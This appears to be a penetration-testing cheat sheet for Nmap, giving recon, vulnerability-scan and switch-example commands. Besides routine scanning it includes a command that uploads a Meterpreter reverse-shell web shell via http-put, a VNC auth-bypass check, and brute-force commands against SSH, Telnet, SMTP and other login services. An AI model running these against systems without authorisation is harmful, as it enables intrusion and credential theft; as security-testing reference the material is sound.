# Nmap

## Most Effective Examples

#### Network Recon

{% code-tabs %}
{% code-tabs-item title="Full Network Recon" %}
```text
nmap -Pn -F -sSU -T5 -oX 10.0.0.0-254.xml 10.0.0.0/24 | grep -v 'filtered|closed' > recon.txt
```
{% endcode-tabs-item %}
{% endcode-tabs %}

{% code-tabs %}
{% code-tabs-item title="Forced TCP & UDP Scan" %}
```text
nmap -Pn -sSU -T4 -p1-65535 -oX 10.1.1.1.xml 10.1.1.1 | grep -v 'filtered|closed'
```
{% endcode-tabs-item %}
{% endcode-tabs %}

{% code-tabs %}
{% code-tabs-item title="Intense TCP Scan Using Open Ports Found From Forced Scan" %}
```text
nmap -nvv -Pn -sSV -T1 -p$(cat 10.1.1.1.xml | grep portid | grep protocol=\"tcp\" | cut -d'"' -f4 | paste -sd "," -) --version-intensity 9 -oX 10.1.1.1-intense-tcp.xml 10.1.1.1
```
{% endcode-tabs-item %}
{% endcode-tabs %}

{% code-tabs %}
{% code-tabs-item title="Intense UDP Scan Using Open Ports Found From Forced Scan" %}
```text
nmap -nvv -Pn -sUV -T1 -p$(cat 10.1.1.1.xml | grep portid | grep protocol=\"udp\" | cut -d'"' -f4 | paste -sd "," -) --version-intensity 9 -oX 10.1.1.1-intense-udp.xml 10.1.1.1
```
{% endcode-tabs-item %}
{% endcode-tabs %}

**Common HTTP Ports Enumeration**

```text
nmap -sSV -P0 -p"http*" --script http-enum 192.168.37.53 -oG 10.1.1.1-http-scan.txt
```

#### Generic Vulnerability Scans

`nmap -Pn --script vuln <target>`

`nmap -sV --script vulners --script-args mincvss=5.0 <target>`

`nmap -p 139,445 --script= <target>`

`nmap -p 0-65535 -A -v --script unusual-port  <target>`

`nmap -p 80 <target> -script http-put --script-args http-put.url=’file.asp’,http-put.file=’/root/Documents/Exploits/WebShells/windows-meterpreter-staged-reverse-tcp-443.asp’`

## Switch Examples

**Scan a range of IPs:**  `nmap 192.168.1.1-20`  
**Scan a subnet:**  `nmap 192.168.1.0/24`  
**Discover hostnames:**  `nmap -sL 192.168.0.0/24`  
**Scan targets from a text file:**   `nmap -iL list-of-ips.txt`  
**Scan a single Port:**   `nmap -p 22 <target>`  
**Scan a range of ports:**   `nmap -p 1-100 <target>`  
**Scan 100 most common ports \(Fast\):**   `nmap -F <target>`  
**Scan all 65535 ports:**   `nmap -p- <target>`  
**Scan using TCP connect:**   `nmap -sT <target>`  
**Scan using TCP SYN scan \(default\):**   `nmap -sS <target>`  
**Scan UDP ports:**   `nmap -sU -p 123,161,162 <target>`  
**Scan selected ports - ignore discovery:**   `nmap -Pn -F <target>`  
**Detect OS and Services:**   `nmap -A <target>`  
**Scan for all HTTP servce type:** ﻿ `nmap -sTV -p"http*" <target>`  
**Standard service detection:**   `nmap -sV <target>`  
**Banner Grabbing:**   `nmap -sV --script=banner <target>`  
**More aggressive Service Detection:**   `nmap -sV --version-intensity 5 <target>`  
**Lighter banner grabbing detection:**   `nmap -sV --version-intensity 0 <target>`  
**Scan using default safe scripts:**   `nmap -sV -sC <target>`  
**Get help for a script:**   `nmap --script-help=ssl-heartbleed <target>`  
**Scan using a specific NSE script:**   `nmap -sV -p 443 –script=ssl-heartbleed.nse <target>`  
**Scan with a set of scripts:**   `nmap -sV --script=smb* <target>`  
**Discover hostnames:**   `nmap -sL 192.168.0.0/24`  
**DNS Brute Force:**   `nmap -p 80 --script dns-brute.nse <target>`  
**DNS Broadcast Discovery:**   `nmap --script=broadcast-dns-service-discovery`  
**Find Virtual Hosts on IP:**   `nmap -p 80 --script hostmap-bfk.nse <target>`  
**Traceroute GeoLocation:**   `nmap --traceroute --script traceroute-geolocation.nse -p 80 <target>`  
**VNC Auth Bypass:**   `nmap -sV --script=realvnc-auth-bypass <target>`  
**SSL ROCA Weak keys:**   `nmap -p 22,443 --script rsa-vuln-roca <target>`  
**IMAP Brute:**   `nmap -p 143,993 --script imap-brute <host>`  
**pop3 brute:**   `nmap -sV --script=pop3-brute <target>`  
**Unix rexec brute:**   `nmap -p 512 --script rexec-brute <target>`  
**Unix rlogin brute:**   `nmap -p 513 --script rlogin-brute <target>`  
**SIP Brute:**   `nmap -sU -p 5060 --script=sip-brute <target>`  
**SMTP Brute:**   `nmap -p 25 --script smtp-brute <target>`  
**SNMP Brute:** `nmap -sU --script snmp-brute <target> [--script-args snmp-brute.communitiesdb=<wordlist> ]`  
**SSH Brute:**   `nmap -p 22 --script ssh-brute --script-args userdb=users.lst,passdb=pass.lst \ --script-args ssh-brute.timeout=4s <target>`  
**Telnet Brute:**   `nmap -p 23 --script telnet-brute --script-args userdb=myusers.lst,passdb=mypwds.lst,telnet-brute.timeout=8s <target>`

